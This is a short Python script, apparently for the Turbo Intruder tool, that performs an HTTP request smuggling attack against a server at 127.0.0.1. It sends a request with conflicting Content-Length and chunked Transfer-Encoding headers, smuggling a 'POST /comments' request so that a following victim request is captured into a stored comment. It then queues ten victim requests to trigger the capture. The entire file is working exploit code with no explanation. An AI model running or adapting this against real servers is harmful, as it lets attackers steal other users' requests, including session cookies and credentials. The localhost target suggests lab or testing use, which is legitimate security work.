def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint='http://127.0.0.1:80',
                           concurrentConnections=1,
                           requestsPerConnection=1,
                           pipeline=False,
                           maxRetriesPerRequest=0
                           )

    attack = '''POST / HTTP/1.1
Host: 127.0.0.1:80
Content-Length: 66
Connection: keep-alive
Transfer-Encoding:chunked

1
A
0

POST /comments HTTP/1.1
X-Foo: bar
Content-Length: 61

comment='''
    engine.queue(attack)
    engine.start()

def handleResponse(req, interesting):
    table.add(req)
    if req.code == 200:
        victim = '''GET / HTTP/1.1
Host: 127.0.0.1:80
Connection: close

'''

        for i in range(10):
            req.engine.queue(victim)
